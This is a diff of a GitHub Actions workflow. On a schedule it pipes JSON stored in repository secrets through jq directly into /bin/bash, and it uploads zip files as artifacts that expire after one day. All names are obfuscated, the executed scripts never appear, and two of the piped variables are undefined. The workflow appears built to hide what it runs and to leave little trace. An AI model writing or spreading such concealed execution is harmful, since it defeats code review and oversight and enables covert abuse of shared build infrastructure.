@@ -1,23 +1,25 @@
 name: daozuopinghuan
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '20 5/6 * * *'
 
-jobs:  # 12534
+  schedule:
+    - cron: '7 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: daozuopinghuan
         env:
-          wx649: ${{ secrets.wx649 }}
+          wfg76502: ${{ secrets.wfg76502 }}
         run: |
-          echo $wx649 | jq -r .vca6000 | /bin/bash
-          echo $nzfw1140 | jq -r .ip5855 | /bin/bash
-          echo $re0 | jq -r .anqf5265 | /bin/bash
-          echo $dyd90 | jq -r .cqf6174 | /bin/bash
-          echo $bsyi32 | jq -r .jte73 | /bin/bash
+          printf '%s' "$wfg76502" | jq -r .yzs9 | /bin/bash
+          printf '%s' "$k64099" | jq -r .kuxp0 | /bin/bash
+          printf '%s' "$y8" | jq -r .aw77 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: M5WsO06F
+          path: "*.zip"
+          retention-days: 1
